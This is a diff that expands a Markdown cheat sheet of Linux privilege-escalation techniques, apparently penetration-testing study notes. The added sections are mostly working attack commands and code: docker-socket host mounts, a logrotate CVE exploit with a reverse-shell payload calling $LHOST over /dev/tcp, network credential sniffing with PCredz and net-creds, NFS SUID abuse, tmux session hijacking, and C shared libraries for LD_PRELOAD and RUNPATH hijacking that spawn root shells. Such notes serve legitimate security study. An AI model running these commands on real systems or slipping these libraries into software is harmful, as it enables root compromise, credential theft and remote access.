@@ -122,6 +122,8 @@ ls ~/.ssh
 ls /home/*/.ssh
 ```
 
+> Also check password cracking section
+
 ## Wildcard and PATH Abuse
 
 - Wildcard and path abuse techniques exploit misconfigurations in file handling, especially
@@ -217,7 +219,13 @@ the file system without requiring a password.
 - Members of the docker group can spawn new docker containers.
 
 ```shell
-docker run -v /root:/mnt -it ubuntu
+docker run -v /root:/mnt -it $IMAGE_NAME
+
+docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
+docker -H unix:///app/docker.sock ps
+docker -H unix:///app/docker.sock exec -it $CONTAINER_ID /bin/bash
+
+docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it $IMAGE_NAME chroot /mnt bash
 ```
 
 - Once the container is started we are able to browse the mounted directory and retrieve
@@ -254,4 +262,226 @@ be restricted.
 - This allows for more fine-grained control over which processes have access to certain privileges, 
 making it more secure than the traditional Unix model of granting privileges to users and groups.
 
-to be continued ...
+```shell
+# Enumerating capabilities
+find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
+```
+
+## Cronjobs
+
+```shell
+# Enumerating cronjobs
+find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
+
+# Using pspy, a command-line tool used to view running processes
+./pspy -pf -i 1000
+```
+
+## Logrotate
+
+- To exploit logrotate, we need some requirements that we have to fulfill.
+    - We need write permissions on the log files
+    - Logrotate must run as a privileged user or root
+    - Vulnerable versions: 3.8.6, 3.11.0, 3.15.0, 3.18.0
+
+```shell
+# Determine which option logrotate uses in logrotate.conf
+# Use the exploit adapted to this function.
+grep "create\|compress" /etc/logrotate.conf | grep -v "#"
+
+# Prepare the cve exploit
+git clone https://github.com/whotwagner/logrotten.git
+cd logrotten
+gcc logrotten.c -o logrotten
+
+# Reverse shell payload
+echo 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1' > payload
+```
+
+## Passive Traffic Capture
+
+- Using PCredz to capture credentials over the wire
+
+```shell
+# Installation
+apt install python3-pip && sudo apt install libpcap-dev && sudo apt install file && pip3 install Cython && pip3 install python-libpcap
+
+# extract credentials from a pcap file
+python3 ./Pcredz -f file-to-parse.pcap
+# extract credentials from all pcap files in a folder
+python3 ./Pcredz -d /tmp/pcap-directory-to-parse/
+# extract credentials from a live packet capture on a network interface (need root privileges)
+python3 ./Pcredz -i $INTERFACE -v
+```
+
+- Using net-creds
+
+```shell
+# Choose the interface and start capturing
+sudo python net-creds.py -i eth0
+
+# Read from pcap
+python net-creds.py -p pcapfile
+```
+
+## Weak NFS Permissions
+
+- We can create a `SETUID` binary that executes `/bin/sh` using our local root user.
+- We can then mount the /tmp directory locally, copy the `root-owned` binary over to the NFS server, and set the `SUID` bit.
+
+> Vulnerable to this attack `*(rw,no_root_squash)`
+
+```
+# Check mount
+showmount -e $TARGET_IP
+# Mount share
+sudo mount -t nfs $TARGET_IP:/$SHARE_NAME$ /mnt
+# Copy shell to the mounted share
+cp shell /mnt
+# Set setuid bit
+chmod u+s /mnt/shell
+```
+
+## Hijacking Tmux Sessions
+
+- A user may leave a tmux process running as a privileged user, such as root set up with weak permissions, and can be hijacked.
+- This may be done with the following commands to create a new shared session and modify the ownership.
+
+```shell
+tmux -S /$SOCKET_NAME new -s hijacked_session
+tmux -S /shareds new -s debugsess
+chown root:devs /shareds
+
+# Attach to the tmux session and confirm root privileges.
+tmux -S /shareds
+```
+
+> Below attacks when you have a setuid binary or sudo right to run a binary.
+
+## Shared Libraries
+
+- We can utilize the LD_PRELOAD environment variable to escalate privileges. For this, we need a user with sudo privileges.
+- If we can restart a service or run a binary with root privileges we can exploit it.
+
+```cpp
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void _init() {
+unsetenv("LD_PRELOAD");
+setgid(0);
+setuid(0);
+system("/bin/bash");
+}
+```
+
+- Compile it and get root.
+
+```shell
+# Compiling the payload
+gcc -fPIC -shared -o payload.so payload.c -nostartfiles
+
+# Exploiting payload
+# eg: sudo LD_PRELOAD=payload.so /usr/sbin/apache2 restart
+sudo LD_PRELOAD=payload.so $COMMAND
+```
+
+## Shared Object Hijacking
+
+```shell
+# Print the shared object required by a binary or shared object
+ldd $BINARY
+```
+
+- Check for any non-standard library.
+- It is possible to load shared libraries from custom locations. 
+- One such setting is the `RUNPATH` configuration. Libraries in this folder are given preference over other folders. 
+
+```shell
+readelf -d $BINARY | grep PATH
+# Sample output: 
+# 0x000000000000001d (RUNPATH)   Library runpath: [/abc]
+```
+
+- The configuration allows the loading of libraries from the /abc folder.
+If it is writable by us, this misconfiguration can be exploited by placing a malicious library in /abc, which will take precedence over other folders because entries in this file are checked first.
+
+- Run the binary, generate an error and check which function it is calling from the custom library.
+
+```cpp
+#include<stdio.h>
+#include<stdlib.h>
+#include<unistd.h>
+
+void $CALLED_FUNCTION() {
+    printf("Malicious library loaded\n");
+    setuid(0);
+    system("/bin/sh -p");
+} 
+```
+
+- Compile the library
+
+```shell
+gcc exploit.c -fPIC -shared -o /abc/$CUSTOM_LIBRARY.so
+```
+
+## Python Library Hijcking
+
+### Wrong Write Permissions
+- If we have a script with setuid and have `read` privileges on it.
+- We can check if we have `write` permissions on any module used in it.
+
+```shell
+grep -r "def $FUNCTION_USED" /usr/local/lib/python3.8/dist-packages/$MODULE/*
+ls -al $PATH_TO_MODULE_FILE
+```
+
+- If we can write, add reverse shell code into it.
+
+### Library Path
+
+- In Python, each version has a specified order in which libraries (modules) are searched and imported from. 
+- The order in which Python imports modules from are based on a priority system.
+
+```shell
+# Check paths precedence
+python3 -c 'import sys; print("\n".join(sys.path))'
+# Using pip
+pip3 show $LIBRARY_NAME #eg psutil
+```
+
+- To be able to exploit this, two prerequisites are necessary.
+    -The module that is imported by the script is located under one of the lower priority paths listed via the `PYTHONPATH` variable.
+    - We must have write permissions to one of the paths having a higher priority on the list.
+
+- Create a file with the same name as the library file with reverse shell code.
+
+
+### PYTHONPATH Environment Variable
+
+- `PYTHONPATH` is an environment variable that indicates what directory (or directories) Python can search for modules to import.
+- This is important as if a user is allowed to manipulate and set this variable while running the python binary, they can effectively redirect Python's search functionality to a user-defined location when it comes time to import modules.
+- We can see if we have the permissions to set environment variables for the python binary by checking our sudo permissions:
+
+```shell
+sudo -l
+# eg:(ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
+```
+
+- Create a file with the same name as the library file with reverse shell code in /tmp.
+
+```shell
+sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./file.py
+```
+
+## Other things to check
+
+- Kernal Exploits
+- Sudo version exploit (eg: sudo -u#-1 id)
+- Dirty Pipe
+- Dirt Cow
+- Polkit (pkexec, pkaction, pkcheck)
+- Netfilter
